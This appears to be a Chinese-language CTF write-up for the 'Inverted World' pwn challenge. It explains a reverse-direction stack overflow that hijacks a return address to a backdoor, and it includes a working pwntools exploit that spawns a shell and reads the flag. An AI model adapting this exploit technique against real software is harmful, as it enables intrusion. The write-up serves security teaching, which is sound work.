# Inverted World

> 分类：Pwn

## 题目描述
checksec 之后发现未开启 PIE，开启了 Canary。`main` 函数的 `read` 存在栈溢出，但这个 `read` 是自定义的 `_read` 函数，实现的是和正常 `read` 相反方向进行输入。

## 考察知识点
- 栈溢出
- 反向输入
- 自定义 `read` 的理解
- Canary 绕过（反向输入天然规避）

## 解法
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[255]; // [rsp+0h] [rbp-110h] BYREF
  _BYTE v5[17]; // [rsp+FFh] [rbp-11h] BYREF

  *(_QWORD *)&v5[9] = __readfsqword(0x28u);
  init(argc, argv, envp);
  table();
  write(0, "root@AkyOI-VM:~# ", 0x12uLL);
  read(0, v5, 0x512uLL);  // 自定义的 _read 函数，和 read 相反方向的输入
  write(1, buf, 0x100uLL);
  puts(byte_402509);
  puts("??? What's wrong with the terminal?");
  return 0;
}
```

`_read` 实现反向输入，输入长度 `0x512` 明显大于 255，可以写到低地址栈帧的东西，劫持位于低地址的 `_read` 函数返回地址到 backdoor 中间的部分（因为劫持到开头过不了检测）。

反向输入 `sh` 即可执行 `system("sh")` 拿到 shell。

关于 Canary：因为是反向输入，只要不多写东西就不会修改到 Canary，自然不用故意绕过 Canary。

## EXP

```python
from pwn import*

context.log_level='debug'
context(arch='amd64', os='linux')
context.terminal=['tmux', 'splitw', '-h']

p=remote('???.???.???.???', ?????)

payload=b'a'*0x100
p.sendline(payload+p64(0x040137C)[::-1])
p.sendlineafter("root@AkyOI-VM:~#", "hs")
p.sendline("cat flag")
p.interactive()
```

## 参考答案
flag 未在 writeup 中给出（通过 `cat flag` 获取）。

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week2/pwn/inverted-world.html
